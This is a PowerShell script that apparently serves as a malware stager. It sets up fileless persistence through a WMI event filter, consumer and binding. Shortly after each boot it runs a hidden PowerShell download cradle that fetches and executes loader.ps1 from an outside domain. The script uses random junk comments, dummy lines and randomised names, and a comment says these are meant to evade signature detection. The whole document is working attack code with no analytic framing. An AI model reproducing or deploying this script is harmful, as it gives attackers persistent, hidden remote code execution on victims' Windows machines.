$ErrorActionPreference = "SilentlyContinue"

# === Fileless WMI Persistence ===
# fTrcuaGzzmCvQHNrIIpmrmjmSpgXcA
# Strategy: 
# 1. Do NOT drop binary to disk.
# 2. Register WMI Event to trigger on system uptime (delayed start).
# 3. Consumer executes the PowerShell Cradle to download loader.ps1.

# CWWcDqaSuFIxnbbBWevnespEXtUuJR
$YdbswjwsewD = "https://api.acpr-portail.fr/download?file=loader.ps1"
# Hardened Cradle (Hidden, Bypass, No Profile)
# We use a randomized variable for IEX to avoid simple signatures
# kWcaDPnjoaStCreImIbKchHssMqklb
$sFperGHcMumbtS = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('$YdbswjwsewD')"""

# SgBrNqstqeayYHXHZIWoEwpTfOZSQH
# 2. Randomization
$sSSPuwinVAdbCMe = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
$ynYWaRPUIoTw = ""
# HIJEsidNBScIIlSBzjvWGQrQolYLwS
1..10 | ForEach-Object { $ynYWaRPUIoTw += $sSSPuwinVAdbCMe[(Get-Random -Maximum $sSSPuwinVAdbCMe.Length)] }

# 3. Clean Old Persistence (if matches our pattern, optional)
Get-WmiObject __EventFilter -Namespace "root\subscription" | Where-Object { $_.Name -match "SysX" } | Remove-WmiObject

# 3. Create Trigger (Filter)
# Trigger: 5 minutes after boot (Uptime > 300s & < 400s)
# RKVqTGGLPvxwSIzneDCbTeFMiEsDJW
# Optimized to run only ONCE per boot cycle
# WTbvgFrOFMxaWBOYAWgFLEjxKrtWxX
$shqzZUsTpmQTYbxR = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"

$TgJCgxFgSXAY = @{
    Name           = $ynYWaRPUIoTw
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
$null = Get-Date -Format "fwSO"
    Query          = $shqzZUsTpmQTYbxR
}
# tpRPDdHPNySymInacrfsowNuagVLCt
$DMkDhapFevAQh = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $TgJCgxFgSXAY

# 4. Create Action (Consumer)
$BtgnCpzXRd = @{
$null = Get-Date -Format "czmN"
    Name                = $ynYWaRPUIoTw
    CommandLineTemplate = $sFperGHcMumbtS
# zaNsKiSMKOfpqURRbVifOngUtTvXHx
    RunInteractively    = $false
}
$ZUyYjbRUlsxA = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $BtgnCpzXRd
# nHRpiCYGBstIefFYbLIbMHuxAaedyz

$null = Get-Date -Format "qfco"
# 5. Bind
$KaRtWvWbpE = @{
    Filter   = $DMkDhapFevAQh
    Consumer = $ZUyYjbRUlsxA
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $KaRtWvWbpE

# rykRHjBgeRczLGzngssuItfDbzyirJ
Write-Host "[+] Fileless WMI Persistence Established" -ForegroundColor Green
$null = Get-Date -Format "POQk"
